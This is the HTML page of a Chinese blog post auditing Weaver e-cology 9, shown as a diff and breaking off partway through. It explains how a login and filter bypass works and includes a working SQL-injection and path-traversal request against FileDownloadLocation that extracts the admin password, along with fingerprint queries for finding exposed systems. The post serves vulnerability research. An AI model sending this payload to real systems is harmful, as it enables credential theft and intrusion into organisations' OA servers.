@@ -1,0 +1,1148 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Web, Security, Web安全, Java, Java安全">
+    <meta name="description" content="记录一下我的网安学习">
+    <meta name="author" content="1diot9">
+    
+    <title>
+        
+            泛微e9分析思路 |
+        
+        1diot9&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/baka.png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#CCCCCC","title":"1diot9's Blog","author":"1diot9","avatar":"/images/baka.png","logo":"/images/baka.png","favicon":"/images/baka.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"登上山顶的人沉默不语，半途而废者诉说着旅途的艰辛","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://www.github.com/1diot9","weixin":"img | /images/weixin.jpg","qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2025,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/baka.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               1diot9&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        泛微e9分析思路
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/baka.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">1diot9</span>
+                                
+                                    <span class="author-badge">Lv5</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2026-05-13 20:42:31</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Wed May 13 2026 20:43:48 GMT+0800">2026-05-13 20:43:48</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>7.3k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>32 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文基于9.00.210804 v10.42版本分析</p>
+<p>泛微ecology9（以下简称e9）的安全补丁生效逻辑较为复杂，在多处进行了过滤，导致一开始分析复现漏洞时，很容易出现“为什么这个URL这么写就能绕过了？”的问题。</p>
+<p>此外，e9的漏洞路由也有几类，每一类的鉴权与过滤又稍有不同，导致对于新手来说，更加迷糊了。</p>
+<p>所以本文的目标，是从我自己的视角，记录一下当时是如何从一脸茫然，到若有所思的过程，希望让读者能够触类旁通，掌握e9漏洞的分析方法。</p>
+<p>本人对e9的分析积淀并不多，故文章中难免出现谬误，希望各位师傅理解。</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>版本信息如下：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778463565071-16bc6743-b78a-4302-ba55-65dcdcf8d18e.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778463577271-5dae05c9-8b44-43e0-999b-6ddfcad79c0c.png"  alt="img"></p>
+<p>安装包依旧是从某鱼上收，搭建的背景是Windows11+mysql8.0.20，e9也支持其他类型的数据库，可以自行选择。一般会给安装手册，跟着做就行。</p>
+<p>mysql最好选择8.0.20，因为之前直接用phpstudy自带的8.0.12时，似乎数据库初始化会失败。</p>
+<p>另外，一定记得修改my.ini（安装手册里写了）：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1754797582123-c44b8717-73b7-48d0-bdf5-287050b03d56.png"  alt="img"></p>
+<p>数据库初始化很久，中间可能卡在某个进度（我这儿是67%左右），耐心等一等，半个多小时应该就好了。</p>
+<p>证书激活相关的，收到的链接里应该会给。</p>
+<p>安装好的结构大致如下：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778463855977-c556a193-e39e-4885-a418-faff2ef3afd9.png"  alt="img"></p>
+<p>ecology为主目录，存放项目源码。</p>
+<p>JDK是自己选择的JDK路径。</p>
+<p>Resin是中间件目录，里面存放了启动脚本。</p>
+<p>默认安装会在windows服务中自动添加resin服务：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778463987969-0756031d-2c92-4460-a43b-5d6cedda2de8.png"  alt="img"></p>
+<p>初始状态是“自动”，建议改成手动，自己去Resin目录启动，这样能看到控制台输出。</p>
+<p>添加一下远程调试参数：</p>
+<p>\Resin\conf\resin.properties</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778464127882-dc21a647-19fe-4a17-b2da-b1aad6ed42b2.png"  alt="img"></p>
+<p>启动脚本为：\Resin\resinstart.bat</p>
+<p>双击启动后，出现以下内容就是启动好了：<br><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778464998656-48374796-0c5b-46b8-a990-ffaaab3b88bb.png"  alt="img"></p>
+<p>访问<a href="http://ip:port后，如果跳出数据库初始页面，就是安装好了。">http://ip:port后，如果跳出数据库初始页面，就是安装好了。</a></p>
+<p>其他问题：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778464941958-d016bdad-3af0-4523-95de-3a3b378750fb.png"  alt="img"></p>
+<p>接下来建idea（我这里2025.3.1版本）</p>
+<p>直接用idea打开ecology目录。等待项目索引完成。</p>
+<p>然后按住ctrl，依次单击以下目录：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778464416272-69fdbc5d-06a8-4124-8b76-d9220d74c57e.png"  alt="img"></p>
+<p>全部选中后右击，在弹出框里选择添加到库。这里一定要这么添加，直接到项目结构里去加就不行，会导致分析不到jar，很奇怪就。</p>
+<p>其他的一些依赖目录就可以直接去项目结构里添加了，如下：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778464507635-8c26290a-aff0-47c8-9f67-59057f0c43b2.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778464513834-bc3c2f51-ba5e-4a92-bfe5-5c9bd278683e.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778464519545-08b4a539-f254-4fda-abe1-8b7b7a051a25.png"  alt="img"></p>
+<p>搞完后，到com.caucho.server.http.HttpRequest#handleRequest上打个断点能断下来，远程调试就没问题了。</p>
+<p>另外，weaver.security.filter.SecurityMain#process方法有时候会反编译失败，这里建议去idea64.exe.vmoptions增加idea的内存，然后把所有打开的类都关掉，重启idea，最先打开SecurityMain去反编译一下。</p>
+<p>环境搭建大概就是这些东西。</p>
+<h1 id="分析前置工作"><a href="#分析前置工作" class="headerlink" title="分析前置工作"></a>分析前置工作</h1><p>我分析新系统时，一般会把网上能找到的文章都列出来，并都快速浏览一遍，对整体建立起一个初步印象。</p>
+<p>当时收集到的文章已经全部放到末尾的“附录”和“参考”。</p>
+<p>其中最重要的是 <a class="link"   target="_blank" rel="noopener" href="https://github.com/ax1sX/SecurityList/blob/main/Java_OA/EcologyAudit.md" >https://github.com/ax1sX/SecurityList/blob/main/Java_OA/EcologyAudit.md<i class="fas fa-external-link-alt"></i></a></p>
+<p>里面有前人整理好的审计文档。</p>
+<p>从里面知道了泛微的路由特点：</p>
+<p>&#x2F;weaver&#x2F;*</p>
+<p>&#x2F;*.jsp</p>
+<p>&#x2F;services&#x2F;*</p>
+<p>&#x2F;api&#x2F;*</p>
+<p>&#x2F;*.do</p>
+<p>后面分析时，自己又加了一个：&#x2F;dwr&#x2F;*</p>
+<p>主要过滤类（SecurityFilter、SecurityMain）和安全策略文件（WEB-INF&#x2F;myclasses&#x2F;weaver&#x2F;security&#x2F;rules&#x2F;ruleImp，WEB-INF&#x2F;securityRule）</p>
+<p>安全策略生效特征：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778465499131-429bd32e-17dd-4c57-bee4-732ae329c2d1.png"  alt="img"></p>
+<p>历史补丁URL：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778465532026-70f65a59-f8bc-4e04-88f3-8063e02f2a62.png"  alt="img"></p>
+<p>当然，除了网上的文章，web.xml这种经典配置文件也是需要过一遍的。</p>
+<h1 id="测绘指纹"><a href="#测绘指纹" class="headerlink" title="测绘指纹"></a>测绘指纹</h1><p>Fofa：app&#x3D;”泛微-协同商务系统”</p>
+<p>hunter：app.name&#x3D;&#x3D;”泛微 e-cology 9.0 OA”</p>
+<p>X社区：app&#x3D;”泛微-E-cology”</p>
+<h1 id="FileDownloadLocation文件读取"><a href="#FileDownloadLocation文件读取" class="headerlink" title="FileDownloadLocation文件读取"></a>FileDownloadLocation文件读取</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>为什么第一个选这个漏洞？因为<a class="link"   target="_blank" rel="noopener" href="https://github.com/R4gd0ll/I-Wanna-Get-All%E9%87%8C%E6%89%AB%E5%87%BA%E6%9D%A5%E4%BA%86%EF%BC%8C%E8%80%8C%E4%B8%94%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%AF%94%E8%BE%83%E5%AE%B9%E6%98%93%E9%AA%8C%E8%AF%81%E3%80%82" >https://github.com/R4gd0ll/I-Wanna-Get-All里扫出来了，而且文件读取比较容易验证。<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778465888504-e4398f1f-23a5-42f1-9b3e-8e474af79fdb.png"  alt="img"></p>
+<p>设置一下代理，抓包看一下poc：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778465997803-22b99373-b24e-49db-810e-a8611cffaf49.png"  alt="img"></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/weaver/weaver.email.FileDownloadLocation/login/LoginSSOxjsp/x.FileDownloadLocation?ddcode=7ea7ef3c41d67297&amp;downfiletype=eml&amp;download=1&amp;mailId=1123+union+select+*+from+(select+1+as+resourceid,&#x27;../ecology/WEB-INF/prop/mobilemode.properties&#x27;+as+x2,&#x27;3&#x27;+as+x3,(select++*+from+(select+*+from+(select+password+from+HrmResourceManager+where+id=1)x)x)+as+x4,5+as+x5,6+as+x6)x+where+1=1&amp;mailid=action.WorkflowFnaEffectNew&amp;parentid=0</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8060</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>charset=UTF-8</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br></pre></td></tr></table></figure>
+
+<p>能够看到，是&#x2F;weaver&#x2F;*类接口。所以后面的weaver.email.FileDownloadLocation直接对应利用类。</p>
+<p>&#x2F;login&#x2F;LoginSSOxjsp&#x2F;x.FileDownloadLocation会对应到weaver.email.FileDownloadLocation这个servlet里的路径，一般不会参与方法调用：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778480533374-afea70c1-b0ec-4c23-829f-3d478a3e1677.png"  alt="img"></p>
+<p>..&#x2F;ecology&#x2F;WEB-INF&#x2F;prop&#x2F;mobilemode.properties明显对应的文件路径，另外还执行了select+password+from+HrmResourceManager+where+id&#x3D;1，这个在数据库中对应的是管理员密码：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778466217563-352d72a7-59c3-4f8b-99ca-a4d3d8fc2765.png"  alt="img"></p>
+<p>能发现对应的password在响应头content-disposition的filename里出现了。</p>
+<p>ok，现在直接去weaver.email.FileDownloadLocation打断点，只看这个漏洞的原因，不去关注前面的doFilter：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778467256347-c9dcb64f-bdcb-4fe1-b0b2-6cb05acd5f79.png"  alt="img"></p>
+<p>这里的ddcode参数会经过DES解密，把_前面的数字提取出来，作为User的Id。这里var3必须有值，不然会重定向到登录页面，所以这里让var23为1，因为User(1)对应的是管理员，一定存在。DesUtils里的密钥是硬编码的，因此可以自行构造：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778467651111-1ac60300-1829-47d7-80e4-d88da538c1e8.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778467674206-576c8f75-c432-4b57-a703-3d4b5bf0aa2a.png"  alt="img"></p>
+<p>接着往下，跟进downloadEml：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778467931457-2f9a47e5-4c52-4995-88ac-e33991a341e0.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778468534724-15d5e4e0-c03e-4fd0-a032-590e34377dbb.png"  alt="img"></p>
+<p>执行的sql语句最后为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> haseml, emlpath, emlName, subject, folderid, id <span class="keyword">from</span> MailResource <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1123</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">as</span> resourceid,<span class="string">&#x27;../ecology/WEB-INF/prop/mobilemode.properties&#x27;</span> <span class="keyword">as</span> x2,<span class="string">&#x27;3&#x27;</span> <span class="keyword">as</span> x3,(<span class="keyword">select</span>  <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> password <span class="keyword">from</span> HrmResourceManager <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>)x)x) <span class="keyword">as</span> x4,<span class="number">5</span> <span class="keyword">as</span> x5,<span class="number">6</span> <span class="keyword">as</span> x6)x <span class="keyword">where</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ((resourceid <span class="keyword">in</span> (<span class="number">1</span>)))</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778468377009-93bec705-fbd7-4900-b56b-8bc8682b9c02.png"  alt="img"></p>
+<p>这里让emlpath和..&#x2F;ecology&#x2F;WEB-INF&#x2F;prop&#x2F;mobilemode.properties对应，</p>
+<p>subject和(select  * from (select * from (select password from HrmResourceManager where id&#x3D;1)x)x)对应</p>
+<p>subject会通过setFilename设置，emlpath会通过setFilerealpath设置，然后跟进singleDownload：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778468871681-4978741d-4462-42e6-be90-f388d635d892.png"  alt="img"></p>
+<p>这里变量乱了，不过能看出来是把subject设置到请求头，然后根据emlpath读文件，并写入请求体。这就是这个漏洞的原理。</p>
+<h2 id="SQL变形分析"><a href="#SQL变形分析" class="headerlink" title="SQL变形分析"></a>SQL变形分析</h2><p>URL中为什么要有&#x2F;login&#x2F;LoginSSOxjsp&#x2F;x.FileDownloadLocation？知道大概率是用来绕过的，但是为什么这样能绕过？</p>
+<p>我先把这一段去掉了，只留下&#x2F;weaver&#x2F;weaver.email.FileDownloadLocation，发起请求，发现到不了doGet，重定向到login了：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778477698350-bf0ac43c-18d8-4939-9b22-2ec5e26ddd6a.png"  alt="img"></p>
+<p>&#x2F;weaver&#x2F;weaver.email.FileDownloadLocation&#x2F;logi，重定向到login了。</p>
+<p>&#x2F;weaver&#x2F;weaver.email.FileDownloadLocation&#x2F;login&#x2F;LoginSSOxjsp，能够正常利用。</p>
+<p>&#x2F;weaver&#x2F;weaver.email.FileDownloadLocation&#x2F;login&#x2F;LoginSSOxjs，能够到doGet，但是发现传入的sql语句变形了：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778469256276-2ec7eb16-342f-4202-b2c5-bb81f728a297.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778477726209-368f9f42-3a04-40c8-8751-23aea7f412d7.png"  alt="img"></p>
+<p>&#x2F;weaver&#x2F;weaver.email.FileDownloadLocation&#x2F;login，跟上面的情况一样，能doGet，但sql变形。</p>
+<p>&#x2F;weaver&#x2F;weaver.email.FileDownloadLocation&#x2F;LoginSSOxjsp，同上。</p>
+<p>通过上面的一系列灰盒测试，能够知道，上面的URL有两个作用，一是绕过登录，二是防止sql变形。</p>
+<p>不过，上面所有的响应中，都没有出现errorMsg: securityIntercept，说明安全策略并没有生效，而是其他的代码导致了利用失败。</p>
+<p>我的思路是，从doGet往前找，通过var1.getParameter(“mailId”)，观察哪里的sql最先变形。</p>
+<p>发现weaver.security.webcontainer.XssRequestForWeblogic#doFilter里的还正常，但是到下一个filter就变形了：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778470140856-9acab20c-2ebf-40fa-bd43-41c3feaaa6eb.png"  alt="img"></p>
+<p>但是中间没看到任何处理sql语句的代码，到底是怎么回事？但现在已经排除了其他可能性了，问题一定在weaver.security.webcontainer.XssRequestForWeblogic#doFilter，所以又仔细看了一下：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778470363645-2d683564-c059-458a-9837-97cea30e9290.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778470257786-8b4fec2e-2c3c-4852-a74e-472ea91ef350.png"  alt="img"></p>
+<p>发现chain.doFilter时，传入的req竟然发生了变化，得好好看看这个weaver.security.webcontainer.XssRequestWeblogic：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778470398926-f8540c76-6e49-4d20-bc0d-0fa7a29680c0.png"  alt="img"></p>
+<p>能够发现，getParameter通过if去判断了是否需要用htmlFilter进行过滤。一开始都没关注这个XssRequestWeblogic，想当然以为是处理Xss和Weblogic的，跟sql能有什么关系。</p>
+<p>到这里其实思路就很明晰了，前面的&#x2F;login&#x2F;LoginSSOxjsp，大概率是用来阻止进入过滤的。</p>
+<p>跟进weaver.security.core.SecurityCore#isXssFilter看一下：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778470924264-81588a09-196a-4ede-ab63-242207cd8783.png"  alt="img"></p>
+<p>这里会遍历xssList里的接口，与实际访问的path进行matches，match到就put进xssPathMap，然后返回result（默认是false）。返回false时，就不会进行过滤。</p>
+<p>xssList里有&#x2F;login&#x2F;LoginSSO.jsp，而 . 在matches里被当作任意字符，所以可以通过&#x2F;login&#x2F;LoginSSOxjsp去匹配成功，从而绕过过滤。</p>
+<p>如果不满足，就会进行HTMLFilter进行过滤：</p>
+<p>在这里会对union select等危险字符进行全角化处理。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778078010023-e99c0922-2e24-431f-9f6a-b593f365dc1e.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778078023097-1a53d1d1-7ea4-4644-b912-eb5949a6c8e1.png"  alt="img"></p>
+<p>所有规则：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778078042295-0d51b89f-03e1-4262-8cf6-c4edea6b562a.png"  alt="img"></p>
+<p>ok，到这里就知道为什么sql会变形了，也知道了泛微e9会对所有通过getParameter取出的参数都进行过滤。</p>
+<p>对了，为什么不直接写&#x2F;login&#x2F;LoginSSO.jsp？</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778477299768-6504eec7-3f01-43c5-82e4-c990b4f6d1e7.png"  alt="img"></p>
+<p>.jsp是会被安全规则拦截的，具体为什么，后面再分析。</p>
+<h2 id="登录绕过分析"><a href="#登录绕过分析" class="headerlink" title="登录绕过分析"></a>登录绕过分析</h2><p>上面分析了为什么能实现sql绕过，但是还有个登录重定向为什么能绕过没分析。</p>
+<p>请求&#x2F;weaver&#x2F;weaver.email.FileDownloadLocation</p>
+<p>我这里的思路是尽可能在后面打断点，看最终会在哪里跳出。</p>
+<p>我们知道主要的安全逻辑在weaver.security.filter.SecurityMain#process，而下一个调用栈是weaver.security.webcontainer.XssRequestForWeblogic#doFilter，所以在这两个方法断点。</p>
+<p>发现能断到SecurityMain，但是XssRequestForWeblogic不行，所以确定到登录逻辑在process方法。</p>
+<p>最终确定到：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778471824578-2081382c-77ed-4e6b-8412-26fbe636cb2c.png"  alt="img"></p>
+<p>再请求&#x2F;weaver&#x2F;weaver.email.FileDownloadLocation&#x2F;login&#x2F;LoginSSOxjsp：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778471935289-bb73a2cc-090d-43f0-bb50-0a395e0bd89d.png"  alt="img"></p>
+<p>发现isLogin变化，去找isLogin的赋值代码：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778471965253-486c3587-c78c-4794-85d8-9d58bb35628a.png"  alt="img"></p>
